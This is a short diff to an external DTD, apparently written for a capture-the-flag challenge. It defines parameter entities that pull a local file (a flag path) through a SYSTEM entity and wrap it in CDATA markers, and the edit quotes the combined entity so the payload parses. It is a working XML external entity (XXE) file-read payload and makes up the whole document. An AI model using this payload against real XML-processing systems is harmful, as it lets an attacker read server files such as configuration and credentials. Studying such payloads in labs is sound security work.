@@ -1,4 +1,4 @@
 <!ENTITY % beg "<![CDATA[">
 <!ENTITY % payload SYSTEM "file:///flag_39b5940d05a43ac6b4958bed87041f15">
 <!ENTITY % end "]]>">
-<!ENTITY injection %beg%payload%end>
+<!ENTITY injection "%beg%payload%end">
